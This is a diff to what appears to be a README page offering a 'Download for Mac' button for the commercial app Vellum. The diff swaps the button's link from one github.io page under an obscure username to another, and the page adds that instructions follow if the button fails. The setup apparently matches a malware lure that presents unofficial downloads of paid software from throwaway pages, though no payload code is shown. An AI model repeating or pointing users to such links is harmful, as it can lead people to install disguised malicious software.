@@ -4,7 +4,7 @@
 
 ![vellum](https://selfpublishingadvice.org/wp-content/uploads/2017/02/01-Vellum.png)
  
->[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-Vellum-blue?logo=apple&style=for-the-badge)](https://fituganshfgh.github.io/.github/vellum)
+>[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-Vellum-blue?logo=apple&style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/vellum)
 
 >If the button doesn’t work, please follow the instructions below.
 
